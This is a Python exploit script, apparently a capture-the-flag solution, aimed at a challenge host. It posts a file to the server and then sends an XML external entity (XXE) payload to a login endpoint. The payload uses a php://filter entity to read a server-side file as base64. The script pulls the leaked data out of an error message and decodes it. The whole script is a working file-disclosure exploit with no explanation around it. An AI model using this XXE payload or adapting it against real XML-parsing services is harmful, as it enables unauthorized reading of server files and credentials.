import requests
from requests.api import post
import urllib.parse
import codecs
import base64
import os

TARGET_URL = "http://chall.ctf-ehcon.ml:32104"
def post_file(file):
    f = codecs.open(file,'rb')
    lines = f.read()
    data = {"content" : lines}
    res = requests.post(f"{TARGET_URL}/flag.php",data=data)
    print(res.text)

def get_result():
    data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/files/result.pdf"> ]><root><email>&xxe;</email><password></password></root>'
    res = requests.post(f"{TARGET_URL}/login.php",data=data)
    i = res.text.index("Sorry, ")+7
    j = res.text.index(" is already registered!")
    text = res.text[i:j]
    f = open("result.pdf", "w")
    f.write(text)
    f.close()
    os.system("base64 -d result.pdf > result2.pdf")

post_file('abc.html')
get_result()